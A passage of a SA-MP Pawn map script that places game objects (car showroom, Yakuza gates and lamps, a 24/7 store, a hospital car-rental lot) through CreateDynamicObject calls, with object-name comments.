	CreateDynamicObject(1318,754.70001221,-1382.30004883,14.30000019,0.00000000,0.00000000,0.00000000); //object(arrow) (1)
	CreateDynamicObject(1318,754.70001221,-1382.30004883,15.50000000,0.00000000,180.00000000,0.00000000); //object(arrow) (2)
	CreateDynamicObject(3934,744.20001221,-1364.19995117,24.70000076,0.00000000,0.00000000,0.00000000); //object(helipad01) (1)
	CreateDynamicObject(3934,737.59997559,-1375.59997559,24.70000076,0.00000000,0.00000000,0.00000000); //object(helipad01) (2)

	//                          WANG CARS PLAYA                     //
	CreateDynamicObject_e(11317,477.69921875,-1872.39941406,9.60000038,0.00000000,0.00000000,270.00000000); //object(carshow_sfse) (1)
	CreateDynamicObject_e(3851,481.89999390,-1852.90002441,6.50000000,0.00000000,0.00000000,90.00000000); //object(carshowwin_sfsx) (2)
	CreateDynamicObject_e(3851,468.79998779,-1853.19995117,6.40000010,0.00000000,0.00000000,90.00000000); //object(carshowwin_sfsx) (3)
	CreateDynamicObject_e(3851,455.70001221,-1853.30004883,6.40000010,0.00000000,0.00000000,90.00000000); //object(carshowwin_sfsx) (4)
	CreateDynamicObject_e(10184,502.69921875,-1845.39941406,4.19999981,0.00000000,90.00000000,179.99450684); //object(sfcopdr) (1)
	CreateDynamicObject_e(10184,496.70001221,-1845.40002441,4.19999981,0.00000000,90.00000000,179.99450684); //object(sfcopdr) (2)
	CreateDynamicObject_e(3851,455.70001221,-1879.30004883,6.40000010,0.00000000,0.00000000,90.00000000); //object(carshowwin_sfsx) (6)
	CreateDynamicObject_e(3851,468.89999390,-1879.09997559,6.40000010,0.00000000,0.00000000,90.00000000); //object(carshowwin_sfsx) (7)
	CreateDynamicObject_e(3851,448.29998779,-1872.50000000,6.30000019,0.00000000,0.00000000,0.00000000); //object(carshowwin_sfsx) (8)
	CreateDynamicObject_e(10184,448.29998779,-1871.09997559,1.79999995,0.00000000,0.00000000,0.00000000); //object(sfcopdr) (3)
	CreateDynamicObject_e(10184,456.79998779,-1879.59997559,1.79999995,0.00000000,0.00000000,90.00000000); //object(sfcopdr) (4)
	CreateDynamicObject_e(10184,473.70001221,-1879.59997559,1.79999995,0.00000000,0.00000000,90.00000000); //object(sfcopdr) (5)
	CreateDynamicObject_e(10184,482.89999390,-1894.40002441,1.89999998,0.00000000,0.00000000,90.00000000); //object(sfcopdr) (6)
	CreateDynamicObject_e(10184,498.60000610,-1894.40002441,1.89999998,0.00000000,0.00000000,90.00000000); //object(sfcopdr) (7)
	CreateDynamicObject_e(10184,507.20001221,-1886.09997559,1.89999998,0.00000000,0.00000000,180.00000000); //object(sfcopdr) (8)
	CreateDynamicObject_e(3093,507.20001221,-1894.50000000,7.00000000,0.00000000,0.00000000,89.25000000); //object(cuntgirldoor) (1)
	CreateDynamicObject_e(3093,507.20001221,-1894.50000000,4.50000000,0.00000000,0.00000000,89.24743652); //object(cuntgirldoor) (2)
	CreateDynamicObject_e(10184,474.39999390,-1886.00000000,1.89999998,0.00000000,0.00000000,0.00000000); //object(sfcopdr) (9)
	CreateDynamicObject_e(3361,443.20001221,-1865.09997559,9.39999962,0.00000000,0.00000000,179.99993896); //object(cxref_woodstair) (1)
	CreateDynamicObject_e(3361,437.00000000,-1865.09997559,5.19999981,0.00000000,0.00000000,179.99450684); //object(cxref_woodstair) (2)
	CreateDynamicObject_e(3361,432.79998779,-1865.09997559,2.40000010,0.00000000,0.00000000,179.99450684); //object(cxref_woodstair) (3)
	CreateDynamicObject_e(3361,444.79980469,-1865.19921875,0.10000000,0.00000000,179.99450684,179.99450684); //object(cxref_woodstair) (4)
	CreateDynamicObject_e(10154,477.50000000,-1868.90002441,4.40000010,0.00000000,270.00000000,179.99450684); //object(pier69gdr) (11)
	CreateDynamicObject_e(10154,483.00000000,-1868.90002441,4.40000010,0.00000000,270.00000000,179.99450684); //object(pier69gdr) (12)
	CreateDynamicObject_e(1999,475.39999390,-1866.69995117,4.40000010,0.00000000,0.00000000,0.00000000); //object(officedesk2) (1)
	CreateDynamicObject_e(1999,477.70001221,-1866.69995117,4.40000010,0.00000000,0.00000000,0.00000000); //object(officedesk2) (2)
	CreateDynamicObject_e(1999,480.10000610,-1866.69995117,4.40000010,0.00000000,0.00000000,0.00000000); //object(officedesk2) (3)
	CreateDynamicObject_e(1999,482.29998779,-1866.59997559,4.40000010,0.00000000,0.00000000,0.00000000); //object(officedesk2) (4)
	CreateDynamicObject_e(1999,484.50000000,-1867.19995117,4.40000010,0.00000000,0.00000000,298.00000000); //object(officedesk2) (5)
	CreateDynamicObject_e(1999,475.10000610,-1868.69995117,4.40000010,0.00000000,0.00000000,90.00000000); //object(officedesk2) (6)
	CreateDynamicObject_e(2356,483.29998779,-1867.90002441,4.40000010,0.00000000,0.00000000,0.00000000); //object(police_off_chair) (1)
	CreateDynamicObject_e(2356,481.10000610,-1868.00000000,4.40000010,0.00000000,0.00000000,0.00000000); //object(police_off_chair) (2)
	CreateDynamicObject_e(2356,478.79998779,-1868.19995117,4.40000010,0.00000000,0.00000000,0.00000000); //object(police_off_chair) (3)
	CreateDynamicObject_e(2356,476.39999390,-1867.80004883,4.40000010,0.00000000,0.00000000,0.00000000); //object(police_off_chair) (4)
	CreateDynamicObject_e(2356,475.89999390,-1867.80004883,4.40000010,0.00000000,0.00000000,86.00000000); //object(police_off_chair) (5)
	CreateDynamicObject_e(2356,484.20001221,-1868.59997559,4.40000010,0.00000000,0.00000000,302.00000000); //object(police_off_chair) (6)
	CreateDynamicObject_e(14867,480.20001221,-1869.59997559,5.90000010,0.00000000,0.00000000,0.00000000); //object(bobbie-cupboards) (1)
	CreateDynamicObject_e(3934,481.70001221,-1887.90002441,11.10000038,0.00000000,0.00000000,0.00000000); //object(helipad01) (1)
	CreateDynamicObject_e(3934,499.60000610,-1862.30004883,11.10000038,0.00000000,0.00000000,0.00000000); //object(helipad01) (2)
	CreateDynamicObject_e(3934,464.79998779,-1862.09997559,11.10000038,0.00000000,0.00000000,0.00000000); //object(helipad01) (4)
	CreateDynamicObject_e(8843,502.70001221,-1845.90002441,4.40000010,0.00000000,0.00000000,0.00000000); //object(arrows01_lvs) (1)
	CreateDynamicObject_e(8843,496.60000610,-1846.09997559,4.40000010,0.00000000,0.00000000,180.00000000); //object(arrows01_lvs) (2)
	CreateDynamicObject_e(18462,500.60000610,-1856.09997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (1)
	CreateDynamicObject_e(18462,500.60000610,-1859.59997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (2)
	CreateDynamicObject_e(18462,491.00000000,-1859.59997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (3)
	CreateDynamicObject_e(18462,491.00000000,-1856.09997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (4)
	CreateDynamicObject_e(18462,481.39999390,-1856.09997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (5)
	CreateDynamicObject_e(18462,481.39999390,-1859.59997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (6)
	CreateDynamicObject_e(18462,471.79998779,-1859.59997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (7)
	CreateDynamicObject_e(18462,471.79998779,-1856.09997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (8)
	CreateDynamicObject_e(18462,462.20001221,-1856.09997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (9)
	CreateDynamicObject_e(18462,462.20001221,-1859.59997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (10)
	CreateDynamicObject_e(18462,454.89999390,-1859.59997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (11)
	CreateDynamicObject_e(18462,454.50000000,-1856.09997559,4.30000019,0.00000000,270.00000000,270.00000000); //object(cs_detrok10) (12)
	CreateDynamicObject_e(3378,435.39999390,-1913.80004883,-1.10000002,0.00000000,0.00000000,0.00000000); //object(ce_beerpile01) (1)
	CreateDynamicObject_e(3378,435.50000000,-1936.30004883,-1.10000002,0.00000000,0.00000000,0.00000000); //object(ce_beerpile01) (2)
	CreateDynamicObject_e(996,438.10000610,-1903.90002441,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (1)
	CreateDynamicObject_e(996,432.70001221,-1904.19995117,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (2)
	CreateDynamicObject_e(996,432.89999390,-1915.59997559,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (3)
	CreateDynamicObject_e(996,438.10000610,-1915.59997559,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (4)
	CreateDynamicObject_e(996,438.20001221,-1927.50000000,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (5)
	CreateDynamicObject_e(996,433.00000000,-1927.40002441,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (6)
	CreateDynamicObject_e(996,433.00000000,-1940.00000000,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (7)
	CreateDynamicObject_e(996,438.29998779,-1940.00000000,0.80000001,0.00000000,0.00000000,270.00000000); //object(lhouse_barrier1) (8)
	CreateDynamicObject_e(997,433.89999390,-1947.59997559,0.20000000,0.00000000,0.00000000,0.00000000); //object(lhouse_barrier3) (1)
	CreateDynamicObject_e(18623,430.89999390,-1914.00000000,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (1)
	CreateDynamicObject_e(18623,430.89999390,-1912.40002441,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (2)
	CreateDynamicObject_e(18623,439.89999390,-1912.30004883,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (3)
	CreateDynamicObject_e(18623,439.89999390,-1913.90002441,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (4)
	CreateDynamicObject_e(18623,440.00000000,-1923.80004883,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (5)
	CreateDynamicObject_e(18623,440.00000000,-1925.40002441,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (6)
	CreateDynamicObject_e(18623,430.89999390,-1925.59997559,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (7)
	CreateDynamicObject_e(18623,430.89999390,-1924.00000000,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (8)
	CreateDynamicObject_e(18623,430.89999390,-1936.59997559,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (9)
	CreateDynamicObject_e(18623,430.89999390,-1938.19995117,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (10)
	CreateDynamicObject_e(18623,440.10000610,-1936.59997559,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (11)
	CreateDynamicObject_e(18623,440.10000610,-1938.19995117,-0.10000000,0.00000000,90.00000000,0.00000000); //object(cs_landbit_68_a) (12)

	//                          YAKUZA EXT                      //
	CreateDynamicObject(9482,498.20001221,-1456.50000000,20.00000000,0.00000000,0.00000000,75.99792480); //object(chinagate) (1)
	CreateDynamicObject(3471,506.60000610,-1456.90002441,16.20000076,0.00000000,0.00000000,65.99841309); //object(vgschinalion1) (1)
	CreateDynamicObject(991,506.69921875,-1458.39941406,16.79999924,0.00000000,0.00000000,345.99792480); //object(bar_barriergate1) (2)
	CreateDynamicObject(991,506.69921875,-1458.39941406,19.20000076,0.00000000,0.00000000,345.99792480); //object(bar_barriergate1) (3)
	CreateDynamicObject(991,489.29980469,-1454.50000000,17.50000000,0.00000000,0.00000000,345.99792480); //object(bar_barriergate1) (5)
	CreateDynamicObject(991,489.29980469,-1454.50000000,19.79999924,0.00000000,0.00000000,345.99792480); //object(bar_barriergate1) (6)
	CreateDynamicObject(991,495.59960938,-1456.00000000,22.50000000,0.00000000,0.00000000,347.99743652); //object(bar_barriergate1) (7)
	CreateDynamicObject(991,500.70001221,-1457.09997559,22.50000000,0.00000000,0.00000000,347.99743652); //object(bar_barriergate1) (8)
	CreateDynamicObject(1568,490.60000610,-1450.90002441,16.00000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (1)
	CreateDynamicObject(1568,505.69921875,-1456.09960938,15.19999981,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (2)
	CreateDynamicObject(1568,493.20001221,-1452.30004883,16.00000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (3)
	CreateDynamicObject(1568,507.89941406,-1456.59960938,15.19999981,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(18001,474.29998779,-1520.40002441,25.79999924,0.00000000,270.00000000,93.99978638); //object(int_barbera07) (1)
	CreateDynamicObject(18001,474.20001221,-1519.00000000,25.79999924,0.00000000,270.00000000,93.99902344); //object(int_barbera07) (2)
	CreateDynamicObject(18001,474.20001221,-1519.00000000,33.90000153,0.00000000,270.00000000,93.99902344); //object(int_barbera07) (3)
	CreateDynamicObject(18001,474.29998779,-1520.40002441,33.90000153,0.00000000,270.00000000,93.99902344); //object(int_barbera07) (4)
	CreateDynamicObject(1569,474.29998779,-1521.09997559,19.39999962,0.00000000,0.00000000,96.00000000); //object(adam_v_door) (1)
	CreateDynamicObject(1569,474.00000000,-1518.30004883,19.39999962,0.00000000,0.00000000,275.99853516); //object(adam_v_door) (2)
	CreateDynamicObject(1569,469.39999390,-1514.19995117,39.09999847,0.00000000,0.00000000,347.99853516); //object(adam_v_door) (3)
	CreateDynamicObject(1569,472.29998779,-1514.80004883,39.09999847,0.00000000,0.00000000,167.99743652); //object(adam_v_door) (4)
	CreateDynamicObject(9482,499.50000000,-1556.50000000,20.29999924,0.00000000,0.00000000,127.99792480); //object(chinagate) (1)
	CreateDynamicObject(991,501.20001221,-1555.30004883,22.50000000,0.00000000,0.00000000,36.00000000); //object(bar_barriergate1) (7)
	CreateDynamicObject(991,497.39999390,-1558.09997559,22.50000000,0.00000000,0.00000000,35.99670410); //object(bar_barriergate1) (7)
	CreateDynamicObject(991,506.89999390,-1551.00000000,17.39999962,0.00000000,0.00000000,35.99670410); //object(bar_barriergate1) (7)
	CreateDynamicObject(991,506.89999390,-1551.00000000,19.79999924,0.00000000,0.00000000,35.99670410); //object(bar_barriergate1) (7)
	CreateDynamicObject(991,492.60000610,-1562.00000000,19.79999924,0.00000000,0.00000000,35.99670410); //object(bar_barriergate1) (7)
	CreateDynamicObject(991,492.60000610,-1562.00000000,17.39999962,0.00000000,0.00000000,35.99670410); //object(bar_barriergate1) (7)
	CreateDynamicObject(3471,491.79998779,-1452.00000000,17.10000038,0.00000000,0.00000000,61.99487305); //object(vgschinalion1) (1)
	CreateDynamicObject(1568,497.39999390,-1562.90002441,15.60000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (2)
	CreateDynamicObject(1568,494.89999390,-1564.59997559,15.60000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (2)
	CreateDynamicObject(1568,506.89999390,-1555.59997559,15.60000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (2)
	CreateDynamicObject(1568,509.60000610,-1553.40002441,15.60000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (2)
	CreateDynamicObject(3471,495.79998779,-1563.40002441,17.10000038,0.00000000,0.00000000,307.99035645); //object(vgschinalion1) (1)
	CreateDynamicObject(3471,508.10000610,-1554.59997559,17.10000038,0.00000000,0.00000000,307.98522949); //object(vgschinalion1) (1)
	CreateDynamicObject(1568,503.70001221,-1462.30004883,15.89999962,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,488.50000000,-1457.00000000,16.39999962,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,480.29998779,-1474.69995117,18.20000076,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,494.10000610,-1481.40002441,18.20000076,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,479.60000610,-1499.40002441,19.10000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,491.60000610,-1500.30004883,19.10000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,492.50000000,-1521.40002441,19.10000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,477.70001221,-1525.09997559,19.10000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,489.50000000,-1554.80004883,16.70000076,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,502.79998779,-1546.40002441,16.50000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(3934,471.39999390,-1542.59997559,39.59999847,0.00000000,0.00000000,0.00000000); //object(helipad01) (1)
	CreateDynamicObject(3934,468.50000000,-1526.19995117,39.59999847,0.00000000,0.00000000,0.00000000); //object(helipad01) (2)
	CreateDynamicObject(16290,487.39999390,-1491.19995117,26.29999924,0.00000000,0.00000000,31.99768066); //object(cn2_slines07) (2)
	CreateDynamicObject(16290,487.70001221,-1529.00000000,27.50000000,0.00000000,0.00000000,31.99768066); //object(cn2_slines07) (3)
	CreateDynamicObject(3534,483.79998779,-1493.00000000,26.29999924,0.00000000,179.99450684,11.99707031); //object(trdlamp01) (4)
	CreateDynamicObject(3534,486.10000610,-1489.50000000,27.10000038,0.00000000,179.99450684,11.99157715); //object(trdlamp01) (5)
	CreateDynamicObject(3534,491.79998779,-1483.30004883,24.89999962,0.00000000,179.99450684,11.99157715); //object(trdlamp01) (6)
	CreateDynamicObject(3534,489.29998779,-1485.90002441,26.00000000,0.00000000,179.99450684,11.99707031); //object(trdlamp01) (4)
	CreateDynamicObject(3534,480.89999390,-1497.30004883,25.39999962,0.00000000,179.99450684,11.99707031); //object(trdlamp01) (4)
	CreateDynamicObject(3534,487.20001221,-1526.30004883,28.10000038,0.00000000,179.99450684,11.99157715); //object(trdlamp01) (5)
	CreateDynamicObject(3534,490.60000610,-1522.69995117,26.79999924,0.00000000,179.99450684,11.99157715); //object(trdlamp01) (5)
	CreateDynamicObject(3534,485.10000610,-1529.19995117,27.89999962,0.00000000,179.99450684,11.99157715); //object(trdlamp01) (5)
	CreateDynamicObject(3534,482.00000000,-1533.80004883,26.89999962,0.00000000,179.99450684,11.99157715); //object(trdlamp01) (5)
	CreateDynamicObject(1568,518.59997559,-1448.50000000,14.00000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,519.50000000,-1466.19995117,14.00000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,520.79998779,-1487.40002441,13.30000019,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,521.09997559,-1506.50000000,13.50000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,520.90002441,-1525.19995117,14.00000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,520.09997559,-1538.30004883,14.50000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,519.09997559,-1563.19995117,15.30000019,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,505.20001221,-1575.40002441,15.10000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,487.89999390,-1574.19995117,19.39999962,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,474.89999390,-1573.50000000,23.20000076,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,460.29998779,-1574.19995117,24.10000038,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,460.10000610,-1557.59997559,25.89999962,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,459.89999390,-1543.30004883,27.20000076,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,459.70001221,-1527.30004883,28.50000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,459.70001221,-1513.59997559,29.79999924,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,454.89999390,-1485.40002441,29.79999924,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,449.20001221,-1469.19995117,29.50000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,462.70001221,-1459.30004883,26.50000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,479.10000610,-1450.30004883,20.70000076,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(1568,501.20001221,-1438.69995117,14.00000000,0.00000000,0.00000000,0.00000000); //object(chinalamp_sf) (4)
	CreateDynamicObject(3038,490.00000000,-1502.09997559,28.29999924,0.00000000,0.00000000,90.00000000); //object(ct_lanterns) (1)
	CreateDynamicObject(3038,481.79998779,-1502.09997559,28.20000076,0.00000000,0.00000000,90.00000000); //object(ct_lanterns) (2)
	CreateDynamicObject(3038,473.70001221,-1501.90002441,28.20000076,0.00000000,0.00000000,90.00000000); //object(ct_lanterns) (3)

	//                          24/7 UNITY                      //
	CreateDynamicObject(1665,2810.50000000,-1166.90002441,1025.09997559,0.00000000,0.00000000,0.00000000); //object(propashtray1) (1)
	CreateDynamicObject(2942,1833.19995117,-1840.19995117,13.19999981,0.00000000,0.00000000,270.00000000); //object(kmb_atm1) (1)
	CreateDynamicObject(970,1831.30004883,-1834.69995117,13.10000038,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (1)
	CreateDynamicObject(970,1831.30004883,-1838.90002441,13.10000038,0.00000000,0.00000000,269.99450684); //object(fencesmallb) (2)
	CreateDynamicObject(970,1831.29980469,-1846.39941406,13.10000038,0.00000000,0.00000000,269.98901367); //object(fencesmallb) (3)
	CreateDynamicObject(970,1831.30004883,-1850.59997559,13.10000038,0.00000000,0.00000000,269.99450684); //object(fencesmallb) (4)
	CreateDynamicObject(970,1831.30004883,-1854.80004883,13.10000038,0.00000000,0.00000000,269.99450684); //object(fencesmallb) (5)
	CreateDynamicObject(970,1831.30004883,-1857.90002441,13.10000038,0.00000000,0.00000000,269.99450684); //object(fencesmallb) (6)
	CreateDynamicObject(1251,1835.09960938,-1852.19921875,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (1)
	CreateDynamicObject(1251,1838.30004883,-1852.19995117,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (2)
	CreateDynamicObject(1251,1841.50000000,-1852.19995117,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (3)
	CreateDynamicObject(1251,1842.90002441,-1870.69995117,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (4)
	CreateDynamicObject(1251,1839.59997559,-1870.50000000,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (5)
	CreateDynamicObject(1251,1836.50000000,-1870.30004883,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (6)
	CreateDynamicObject(1251,1833.19995117,-1870.09997559,12.50000000,0.00000000,0.00000000,0.00000000); //object(smashbar) (7)
	CreateDynamicObject(2714,1833.50000000,-1845.50000000,15.89999962,0.00000000,0.00000000,270.00000000); //object(cj_open_sign_2) (1)
	CreateDynamicObject(2714,1833.50000000,-1839.69995117,15.89999962,0.00000000,0.00000000,270.00000000); //object(cj_open_sign_2) (2)
	CreateDynamicObject(3666,1831.30004883,-1832.50000000,13.10000038,0.00000000,0.00000000,0.00000000); //object(airuntest_las) (1)
	CreateDynamicObject(3666,1831.19995117,-1841.19995117,13.10000038,0.00000000,0.00000000,0.00000000); //object(airuntest_las) (2)
	CreateDynamicObject(3666,1831.30004883,-1844.09997559,13.10000038,0.00000000,0.00000000,0.00000000); //object(airuntest_las) (3)
	CreateDynamicObject(3361,1837.30004883,-1833.50000000,14.00000000,0.00000000,0.00000000,180.00000000); //object(cxref_woodstair) (1)
	CreateDynamicObject(7313,1833.50000000,-1847.80004883,15.39999962,0.00000000,0.00000000,270.00000000); //object(vgsn_scrollsgn01) (1)
	CreateDynamicObject(643,1845.50000000,-1838.59997559,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (1)
	CreateDynamicObject(643,1848.00000000,-1843.50000000,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (2)
	CreateDynamicObject(643,1852.69995117,-1844.80004883,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (3)
	CreateDynamicObject(643,1854.19995117,-1839.50000000,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (4)
	CreateDynamicObject(643,1848.09997559,-1850.00000000,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (5)
	CreateDynamicObject(643,1843.90002441,-1846.80004883,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (6)
	CreateDynamicObject(643,1841.90002441,-1841.50000000,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (7)
	CreateDynamicObject(643,1836.19995117,-1837.50000000,16.50000000,0.00000000,0.00000000,0.00000000); //object(kb_chr_tbl_test) (9)
	CreateDynamicObject(8041,1829.69995117,-1868.09997559,18.10000038,0.00000000,0.00000000,179.99450684); //object(apbarriergate06_lvs) (1)
	CreateDynamicObject(16151,1852.59997559,-1858.90002441,17.29999924,0.00000000,0.00000000,270.00000000); //object(ufo_bar) (1)
	CreateDynamicObject(17578,1838.69995117,-1836.00000000,27.89999962,0.00000000,0.00000000,180.00000000); //object(liquorstore02_lae2) (1)
	CreateDynamicObject(17578,1839.59997559,-1837.90002441,27.89999962,0.00000000,0.00000000,0.00000000); //object(liquorstore02_lae2) (2)
	CreateDynamicObject(2714,1833.50000000,-1838.69995117,15.89999962,0.00000000,0.00000000,270.00000000); //object(cj_open_sign_2) (2)
	CreateDynamicObject(2714,1833.50000000,-1837.69995117,15.89999962,0.00000000,0.00000000,270.00000000); //object(cj_open_sign_2) (2)
	CreateDynamicObject(2714,1833.50000000,-1836.59997559,15.89999962,0.00000000,0.00000000,270.00000000); //object(cj_open_sign_2) (2)
	CreateDynamicObject(2714,1833.50000000,-1835.50000000,15.89999962,0.00000000,0.00000000,270.00000000); //object(cj_open_sign_2) (2)
	CreateDynamicObject(13562,1835.09997559,-1848.00000000,17.39999962,0.00000000,0.00000000,0.00000000); //object(bigsprunkpole) (1)

	//                      YAKUZA EXT                //
	CreateDynamicObject(3029,-2171.30004883,639.90002441,1051.19995117,0.00000000,0.00000000,270.00000000); //object(cr1_door) (1)
	CreateDynamicObject(1828,-2170.30004883,637.59997559,1051.40002441,0.00000000,0.00000000,274.00000000); //object(man_sdr_rug) (2)
	CreateDynamicObject(14705,-2166.80004883,644.09997559,1057.30004883,0.00000000,0.00000000,0.00000000); //object(int2vase) (1)
	CreateDynamicObject(2283,-2170.39990234,647.20001221,1059.09997559,0.00000000,0.00000000,0.00000000); //object(frame_thick_3) (1)
	CreateDynamicObject(2273,-2165.30004883,646.70001221,1059.59997559,0.00000000,0.00000000,0.00000000); //object(frame_fab_1) (1)
	CreateDynamicObject(2270,-2170.69995117,638.09997559,1057.40002441,0.00000000,0.00000000,180.00000000); //object(frame_wood_6) (1)
	CreateDynamicObject(2064,-2170.30004883,645.90002441,1057.19995117,0.00000000,0.00000000,0.00000000); //object(cj_feildgun) (1)
	CreateDynamicObject(3029,475.39999390,-1499.59997559,19.50000000,0.00000000,0.00000000,354.50000000); //object(cr1_door) (2)

	//                      AUTOS RENTA HOSPITAL                //
	CreateDynamicObject(8041,1269.90002441,-1337.59997559,17.89999962,0.00000000,0.00000000,180.00000000); //object(apbarriergate06_lvs) (1)
	CreateDynamicObject(3877,1269.79980469,-1326.39941406,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (1)
	CreateDynamicObject(3877,1270.59997559,-1349.09997559,14.19999981,0.00000000,0.00000000,0.00000000); //object(sf_rooflite) (2)
	CreateDynamicObject(4638,1269.90002441,-1328.50000000,14.19999981,0.00000000,0.00000000,0.00000000); //object(paypark_lan01) (1)
	CreateDynamicObject(4638,1270.00000000,-1346.90002441,14.19999981,0.00000000,0.00000000,0.00000000); //object(paypark_lan01) (2)
	CreateDynamicObject(3458,1281.90002441,-1311.40002441,13.89999962,0.00000000,0.00000000,90.00000000); //object(vgncarshade1) (1)
	CreateDynamicObject(3458,1282.19995117,-1361.30004883,13.89999962,0.00000000,0.00000000,90.00000000); //object(vgncarshade1) (2)
	CreateDynamicObject(984,1280.80004883,-1290.90002441,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit2) (1)
	CreateDynamicObject(984,1280.69995117,-1385.00000000,13.19999981,0.00000000,0.00000000,90.00000000); //object(fenceshit2) (2)
	CreateDynamicObject(984,1287.09997559,-1378.59997559,13.19999981,0.00000000,0.00000000,0.00000000); //object(fenceshit2) (3)
